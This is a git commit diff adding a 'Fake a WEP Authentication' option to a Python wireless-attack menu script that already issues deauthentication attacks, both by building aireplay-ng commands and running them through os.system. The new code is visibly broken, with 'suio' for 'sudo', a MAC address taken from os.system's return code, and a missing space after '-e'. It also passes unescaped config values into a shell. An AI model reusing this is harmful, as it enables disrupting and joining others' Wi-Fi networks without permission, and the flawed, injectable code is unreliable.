d920c5c6ed50f955aeeb686cad40c5409181b6b2
Joe Maples <joe@maples.dev>
2021-12-11 16:59:36 -0500

    Implement WEP Fake Auth

--- injection.py
+++ injection.py
@@ -4,6 +4,7 @@ import configparser
 
 def injectionMenu():
 	print("1. Perform a Deauthentication Attack")
+	print("2. Fake a WEP Authentication")
 	
 def injectionInput(config):
 	injectionMenu()
@@ -12,6 +13,8 @@ def injectionInput(config):
 	#Issue a deauthentication attack
 	if command == "1":
 		deauth(config)
+	elif command == "2":
+		fake_auth(config)
 	#Return to the main menu
 	else:
 		return
@@ -22,4 +25,13 @@ def deauth(config):
 	target_mac = config['target']['mac']
 	nic = config['host']['nic']
 	cmd = "sudo aireplay-ng -0 1 -a " + bssid + " -c " + target_mac + " " + nic
-	os.system(cmd)	
+	os.system(cmd)
+
+def fake_auth(config):
+	#Aireplay command to send a fake auth
+	nic = config['host']['nic']
+	local_mac = os.system("ethtool -P " + nic + " | awk '{ print $NF };'")
+	bssid = config['ap']['bssid']
+	ssid = config['ap']['ssid']
+	cmd = "suio aireplay-ng -1 6000 -o 1 -q 10 -e" + ssid + " -a " + bssid + " -h " + local_mac + " " + nic
+	os.system(cmd)
